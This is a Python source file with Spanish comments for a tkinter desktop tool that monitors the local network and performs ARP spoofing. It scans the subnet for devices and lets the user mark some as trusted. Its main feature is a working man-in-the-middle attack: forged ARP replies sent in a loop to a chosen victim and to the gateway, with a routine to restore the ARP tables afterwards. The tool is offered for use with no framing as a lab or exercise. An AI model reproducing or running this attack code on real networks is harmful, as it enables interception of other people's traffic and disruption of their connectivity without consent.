# --- Importación de Librerías ---
# tkinter: Se utiliza para crear la interfaz gráfica de la aplicación (ventanas, botones, etc.).
# scapy: Es una potente biblioteca para manipular paquetes de red. La usamos para crear y enviar paquetes ARP.
# time: Permite hacer pausas en la ejecución (ej. en el bucle de ataque).
# threading: Permite ejecutar procesos en segundo plano (como el escaneo de red o el ataque) sin congelar la interfaz gráfica.
# uuid: Se usa para obtener la dirección MAC de la máquina local.
# subprocess: Permite ejecutar comandos del sistema operativo, como los necesarios para obtener la IP y la puerta de enlace.

import tkinter as tk
from tkinter import scrolledtext, messagebox
from scapy.all import ARP, Ether, srp, send
import time
import threading
import uuid
import subprocess

class ArpSpoofingApp:
    """
    Clase principal que encapsula toda la lógica y la interfaz gráfica de la aplicación.
    """
    def __init__(self, root):
        # --- Constructor de la Clase: Inicialización de variables ---
        self.ventana = root  # La ventana principal de tkinter

        # Variables para almacenar información de la red local.
        self.ip_usuario = self._obtener_ip_propia()
        self.mac_usuario = self._obtener_mac_propia()
        self.ip_puerta_enlace = self._obtener_puerta_enlace()

        # Banderas y hilos para controlar los procesos en segundo plano.
        self.ataque_en_curso = False  # ¿Hay un ataque de ARP spoofing activo?
        self.hilo_ataque = None       # Hilo que ejecutará el ataque.
        self.escaneo_en_curso = False # ¿Se está escaneando la red?
        self.hilo_escaneo = None      # Hilo para el monitor de red.

        # Conjuntos (sets) para gestionar los dispositivos encontrados en la red.
        self.dispositivos_conocidos = set()      # Guarda todas las IPs detectadas.
        self.dispositivos_de_confianza = set() # IPs que el usuario ha marcado como seguras.
        self.nombres_dispositivos = {}         # Diccionario para guardar nombres personalizados {ip: nombre}.

        # --- Configuración Inicial ---
        self._configurar_gui() # Llama a la función que crea los elementos visuales.

        # Verificación de que se pudo obtener la información de red esencial.
        if not self.ip_puerta_enlace:
            messagebox.showerror("Error de Red", "No se pudo obtener la puerta de enlace. La aplicación no puede continuar.")
            self.ventana.destroy() # Cierra la app si no hay puerta de enlace.
        else:
            self.iniciar_escaneo() # Si todo está bien, comienza a monitorear la red.
            # Define qué hacer cuando el usuario cierra la ventana (el botón "X").
            self.ventana.protocol("WM_DELETE_WINDOW", self.al_cerrar)

    def _obtener_ip_propia(self):
        """
        Obtiene la dirección IP local principal de la máquina ejecutando un comando de sistema.
        Es más robusto que otros métodos que pueden devolver la IP de loopback (127.0.0.1).
        """
        try:
            # Comando para Linux/macOS que muestra las IPs, filtra las locales y extrae la primera.
            comando = "ip addr show | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1"
            proceso = subprocess.run(comando, shell=True, capture_output=True, text=True)
            # Devuelve la primera IP encontrada, o un mensaje de error si no hay ninguna.
            return proceso.stdout.strip().split('\n')[0] if proceso.stdout else "No encontrada"
        except Exception:
            return "No encontrada"

    def _obtener_mac_propia(self):
        """
        Obtiene la dirección MAC de la máquina utilizando la librería uuid.
        """
        mac_num = uuid.getnode() # Obtiene la MAC como un número.
        # Formatea el número a una cadena hexadecimal legible (ej: 00:1a:2b:3c:4d:5e).
        mac_hex = '{:012x}'.format(mac_num)
        return ':'.join(mac_hex[i:i+2] for i in range(0, 12, 2))

    def _obtener_puerta_enlace(self):
        """
        Obtiene la IP de la puerta de enlace (router) ejecutando un comando de sistema.
        """
        try:
            # Comando para Linux/macOS que busca la ruta por defecto y extrae la IP del router.
            comando = "ip route | grep default | awk '{print $3}'"
            proceso = subprocess.run(comando, shell=True, capture_output=True, text=True)
            return proceso.stdout.strip()
        except Exception:
            return None # Devuelve None si falla.

    def _obtener_mac_remota(self, ip):
        """
        Obtiene la dirección MAC de cualquier dispositivo en la red a partir de su IP.
        Usa Scapy para enviar una solicitud ARP ("¿Quién tiene esta IP?") y espera la respuesta.
        """
        try:
            # Se crea un paquete ARP preguntando por la IP `ip`.
            # El destino de la capa Ethernet (dst) es ff:ff:ff:ff:ff:ff, que es la dirección de broadcast (para todos en la red).
            paquete_arp = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            # srp() envía y recibe paquetes. Timeout de 2 segundos. verbose=0 para no mostrar logs de scapy.
            respuestas, _ = srp(paquete_arp, timeout=2, verbose=0)
            if respuestas:
                # Si hay respuesta, devuelve la MAC (hardware source) del primer paquete respondido.
                return respuestas[0][1].hwsrc
        except Exception as e:
            self.log_error(f"Error al obtener MAC de {ip}: {e}")
        return None # Devuelve None si no hay respuesta o hay un error.

    def _escanear_red(self):
        """
        Escanea toda la subred local (ej. 192.168.1.0/24) para descubrir dispositivos activos.
        Funciona de forma similar a `_obtener_mac_remota`, pero para todo un rango de IPs.
        """
        # Define el rango de IPs a escanear. "/24" es una máscara de subred común para redes domésticas.
        rango_ip = self.ip_puerta_enlace + "/24"
        try:
            paquete_arp = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=rango_ip)
            respuestas, _ = srp(paquete_arp, timeout=2, verbose=0)
            # Crea un conjunto con todas las IPs (protocol source) que respondieron.
            dispositivos = {recibido.psrc for _, recibido in respuestas}
            return dispositivos
        except Exception as e:
            self.log_error(f"Error durante el escaneo: {e}")
            return set() # Devuelve un conjunto vacío si hay un error.

    def _monitor_de_red_loop(self):
        """
        Bucle principal para el monitoreo de la red. Se ejecuta en un hilo separado.
        Escanea la red periódicamente y actualiza la lista de dispositivos si encuentra nuevos.
        """
        # Primer escaneo al iniciar.
        self.dispositivos_conocidos = self._escanear_red()
        # `after(0, ...)` pide a tkinter que ejecute la función en el hilo principal lo antes posible.
        # Es necesario para actualizar la GUI de forma segura desde un hilo secundario.
        self.ventana.after(0, self.actualizar_display_dispositivos)

        # Bucle que se ejecuta mientras el escaneo esté activo.
        while self.escaneo_en_curso:
            time.sleep(15) # Espera 15 segundos antes del siguiente escaneo.
            dispositivos_actuales = self._escanear_red()
            # Comprueba si el conjunto de dispositivos actuales no es un subconjunto de los ya conocidos.
            # Esto significa que ha aparecido al menos un dispositivo nuevo.
            if not dispositivos_actuales.issubset(self.dispositivos_conocidos):
                self.dispositivos_conocidos.update(dispositivos_actuales) # Añade los nuevos a la lista.
                self.ventana.after(0, self.actualizar_display_dispositivos) # Actualiza la GUI.

    def marcar_como_confianza(self):
        """
        Función que se ejecuta al pulsar el botón "Marcar como Confianza".
        Añade una IP a la lista de confianza y, opcionalmente, le asigna un nombre.
        """
        ip_a_confiar = self.entrada_confianza_ip.get()
        nombre_dispositivo = self.entrada_confianza_nombre.get() # Obtiene el nombre del campo de texto.

        if ip_a_confiar in self.dispositivos_conocidos:
            self.dispositivos_de_confianza.add(ip_a_confiar)

            # Si el usuario escribió un nombre, lo guardamos en el diccionario.
            if nombre_dispositivo:
                self.nombres_dispositivos[ip_a_confiar] = nombre_dispositivo

            # Limpia los campos de entrada después de agregar.
            self.entrada_confianza_ip.delete(0, tk.END)
            self.entrada_confianza_nombre.delete(0, tk.END)
            self.actualizar_display_dispositivos() # Refresca la pantalla para mostrar el cambio.
        else:
            messagebox.showwarning("IP no encontrada", "La IP ingresada no está en la lista de dispositivos detectados.")

    def actualizar_display_dispositivos(self):
        """
        Refresca el área de texto principal para mostrar la lista actualizada de dispositivos,
        separados en "Mi Dispositivo", "Confianza" y "Desconocidos". Muestra los nombres personalizados.
        """
        self.widget_salida.config(state=tk.NORMAL) # Habilita la escritura en el widget.
        self.widget_salida.delete(1.0, tk.END)     # Borra todo el contenido anterior.

        # --- Sección "Mi Dispositivo" ---
        self.widget_salida.insert(tk.END, "--- Mi Dispositivo ---\n")
        self.widget_salida.insert(tk.END, f"  IP del Usuario: {self.ip_usuario}\n")
        self.widget_salida.insert(tk.END, f"  MAC del Usuario: {self.mac_usuario}\n")
        self.widget_salida.insert(tk.END, f"  Puerta de Enlace: {self.ip_puerta_enlace}\n\n")

        # --- Sección "Dispositivos de Confianza" ---
        self.widget_salida.insert(tk.END, "--- Dispositivos de Confianza ---\n")
        if self.dispositivos_de_confianza:
            for ip in sorted(list(self.dispositivos_de_confianza)):
                # Busca si la IP tiene un nombre guardado en el diccionario.
                nombre = self.nombres_dispositivos.get(ip)
                if nombre:
                    # Si tiene nombre, lo muestra.
                    self.widget_salida.insert(tk.END, f"  {nombre}: {ip}\n")
                else:
                    # Si no, solo muestra la IP.
                    self.widget_salida.insert(tk.END, f"  {ip}\n")
        else:
            self.widget_salida.insert(tk.END, "  (Ninguno)\n")
        self.widget_salida.insert(tk.END, "\n")

        # --- Sección "Dispositivos Desconocidos" ---
        # Calcula los desconocidos: todos - confianza - mi_ip - router_ip
        desconocidos = self.dispositivos_conocidos - self.dispositivos_de_confianza - {self.ip_usuario, self.ip_puerta_enlace}
        self.widget_salida.insert(tk.END, "--- Dispositivos Desconocidos ---\n")
        if desconocidos:
            for ip in sorted(list(desconocidos)):
                self.widget_salida.insert(tk.END, f"  {ip}\n")
        else:
            self.widget_salida.insert(tk.END, "  (Ninguno)\n")

        self.widget_salida.config(state=tk.DISABLED) # Deshabilita la escritura para el usuario.
        self.widget_salida.see(tk.END) # Hace scroll automático hasta el final.

    def _configurar_gui(self):
        """
        Crea y organiza todos los widgets (botones, etiquetas, campos de texto) en la ventana.
        """
        self.ventana.title("IPExit - Monitor de Red y ARP Spoofer")
        self.ventana.geometry("500x550")

        # --- Frame (contenedor) para los controles del ataque ---
        frame_ataque = tk.Frame(self.ventana)
        frame_ataque.pack(pady=5, padx=10, fill=tk.X)
        tk.Label(frame_ataque, text="IP Objetivo para Spoofing:").pack(side=tk.LEFT)
        self.entrada_ip = tk.Entry(frame_ataque)
        self.entrada_ip.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        self.boton_iniciar = tk.Button(frame_ataque, text="Iniciar", command=self.iniciar_ataque)
        self.boton_iniciar.pack(side=tk.LEFT, padx=5)
        self.boton_detener = tk.Button(frame_ataque, text="Detener", command=self.detener_ataque, state=tk.DISABLED)
        self.boton_detener.pack(side=tk.LEFT)

        # --- Frame (contenedor) para marcar dispositivos de confianza ---
        frame_confianza = tk.Frame(self.ventana)
        frame_confianza.pack(pady=5, padx=10, fill=tk.X)

        # Sub-frame para la IP a confiar
        sub_frame_ip = tk.Frame(frame_confianza)
        sub_frame_ip.pack(fill=tk.X)
        tk.Label(sub_frame_ip, text="IP a Confiar:").pack(side=tk.LEFT, anchor='w')
        self.entrada_confianza_ip = tk.Entry(sub_frame_ip)
        self.entrada_confianza_ip.pack(side=tk.LEFT, padx=18, expand=True, fill=tk.X)

        # Sub-frame para el nombre opcional
        sub_frame_nombre = tk.Frame(frame_confianza)
        sub_frame_nombre.pack(fill=tk.X, pady=2)
        tk.Label(sub_frame_nombre, text="Nombre (Opcional):").pack(side=tk.LEFT, anchor='w')
        self.entrada_confianza_nombre = tk.Entry(sub_frame_nombre)
        self.entrada_confianza_nombre.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)

        self.boton_confianza = tk.Button(frame_confianza, text="Marcar como Confianza", command=self.marcar_como_confianza)
        self.boton_confianza.pack(pady=5)

        # --- Área de texto principal con scroll ---
        self.widget_salida = scrolledtext.ScrolledText(self.ventana, height=15)
        self.widget_salida.pack(pady=10, padx=10, fill=tk.BOTH, expand=True)
        self.widget_salida.config(state=tk.DISABLED) # El usuario no puede escribir aquí directamente.

    def iniciar_escaneo(self):
        """ Inicia el hilo de monitoreo de red. """
        self.escaneo_en_curso = True
        # Se crea un hilo que ejecutará `_monitor_de_red_loop`. `daemon=True` hace que el hilo se cierre si el programa principal termina.
        self.hilo_escaneo = threading.Thread(target=self._monitor_de_red_loop, daemon=True)
        self.hilo_escaneo.start()

    def detener_escaneo(self):
        """ Detiene el hilo de monitoreo de red. """
        self.escaneo_en_curso = False
        if self.hilo_escaneo:
            self.hilo_escaneo.join(timeout=1) # Espera un máximo de 1 segundo a que el hilo termine.

    def al_cerrar(self):
        """
        Función que se llama al cerrar la ventana. Se asegura de detener todos los procesos
        en segundo plano y restaurar la red antes de cerrar la aplicación.
        """
        self.detener_ataque()
        self.detener_escaneo()
        self.ventana.destroy()

    def _spoof_loop(self, ip_objetivo, mac_objetivo):
        """
        El corazón del ataque ARP spoofing. Envía paquetes falsificados continuamente.
        Se ejecuta en un hilo separado para no bloquear la GUI.
        """
        # Paquete para la víctima: le dice que la IP del router (`psrc`) está en nuestra MAC.
        paquete_victima = ARP(op=2, pdst=ip_objetivo, hwdst=mac_objetivo, psrc=self.ip_puerta_enlace)
        # Paquete para el router: le dice que la IP de la víctima (`psrc`) está en nuestra MAC.
        paquete_router = ARP(op=2, pdst=self.ip_puerta_enlace, hwdst=self._obtener_mac_remota(self.ip_puerta_enlace), psrc=ip_objetivo)

        self.log_ataque(f"Iniciando bucle de spoofing contra {ip_objetivo}...")
        while self.ataque_en_curso:
            send(paquete_victima, verbose=0)
            send(paquete_router, verbose=0)
            time.sleep(2) # Pausa de 2 segundos entre cada envío.
        self.log_ataque("Bucle de spoofing detenido.")

    def _restaurar_arp(self, ip_objetivo, mac_objetivo):
        """
        Restaura las tablas ARP de la víctima y el router a su estado original,
        enviando paquetes con las direcciones MAC correctas.
        """
        self.log_ataque("Restaurando tablas ARP...")
        mac_puerta_enlace = self._obtener_mac_remota(self.ip_puerta_enlace)
        if mac_objetivo and mac_puerta_enlace:
            # Paquete para la víctima con la MAC correcta del router.
            paquete_victima = ARP(op=2, pdst=ip_objetivo, hwdst=mac_objetivo, psrc=self.ip_puerta_enlace, hwsrc=mac_puerta_enlace)
            # Paquete para el router con la MAC correcta de la víctima.
            paquete_router = ARP(op=2, pdst=self.ip_puerta_enlace, hwdst=mac_puerta_enlace, psrc=ip_objetivo, hwsrc=mac_objetivo)
            # Se envían varios paquetes para asegurar que la tabla ARP se corrija.
            send(paquete_victima, count=5, verbose=0)
            send(paquete_router, count=5, verbose=0)
            self.log_ataque("Red restaurada exitosamente.")
        else:
            self.log_ataque("Error al restaurar: no se pudieron obtener las MACs correctas.")

    def iniciar_ataque(self):
        """
        Se ejecuta al pulsar "Iniciar". Valida la IP objetivo, obtiene su MAC y
        lanza el hilo de spoofing.
        """
        if self.ataque_en_curso: return # No hacer nada si ya hay un ataque.
        ip_objetivo = self.entrada_ip.get()
        if not ip_objetivo:
            messagebox.showwarning("Entrada inválida", "Por favor, ingrese una IP objetivo.")
            return

        self.log_ataque(f"Obteniendo MAC de {ip_objetivo}...")
        mac_objetivo = self._obtener_mac_remota(ip_objetivo)
        if not mac_objetivo:
            self.log_ataque(f"No se pudo encontrar la MAC para {ip_objetivo}.")
            return

        self.log_ataque(f"MAC del objetivo encontrada: {mac_objetivo}")
        self.ataque_en_curso = True
        self.hilo_ataque = threading.Thread(target=self._spoof_loop, args=(ip_objetivo, mac_objetivo), daemon=True)
        self.hilo_ataque.start()

        # Actualiza el estado de los botones.
        self.boton_iniciar.config(state=tk.DISABLED)
        self.boton_detener.config(state=tk.NORMAL)

    def detener_ataque(self):
        """
        Se ejecuta al pulsar "Detener". Para el bucle de spoofing y llama a la
        función para restaurar la red.
        """
        if not self.ataque_en_curso: return
        self.log_ataque("Señal de detención enviada...")
        self.ataque_en_curso = False # Esto hará que el `while` en `_spoof_loop` termine.
        if self.hilo_ataque: self.hilo_ataque.join(timeout=3) # Espera a que el hilo termine.

        ip_objetivo = self.entrada_ip.get()
        mac_objetivo = self._obtener_mac_remota(ip_objetivo)
        if ip_objetivo and mac_objetivo:
            self._restaurar_arp(ip_objetivo, mac_objetivo)

        # Actualiza el estado de los botones.
        self.boton_iniciar.config(state=tk.NORMAL)
        self.boton_detener.config(state=tk.DISABLED)

    def log_error(self, mensaje):
        """ Función de ayuda para mostrar mensajes de ERROR en el área de texto. """
        self.widget_salida.config(state=tk.NORMAL)
        self.widget_salida.insert(tk.END, f"ERROR: {mensaje}\n")
        self.widget_salida.config(state=tk.DISABLED)
        self.widget_salida.see(tk.END)

    def log_ataque(self, mensaje):
        """ Función de ayuda para mostrar mensajes de ATAQUE en el área de texto. """
        self.widget_salida.config(state=tk.NORMAL)
        self.widget_salida.insert(tk.END, f"ATAQUE: {mensaje}\n")
        self.widget_salida.config(state=tk.DISABLED)
        self.widget_salida.see(tk.END)


# --- Punto de Entrada de la Aplicación ---
if __name__ == "__main__":
    # Esta parte solo se ejecuta cuando el script se corre directamente.
    root = tk.Tk()              # Crea la ventana principal.
    app = ArpSpoofingApp(root)  # Crea una instancia de nuestra clase de aplicación.
    root.mainloop()             # Inicia el bucle de eventos de tkinter, que mantiene la ventana abierta.
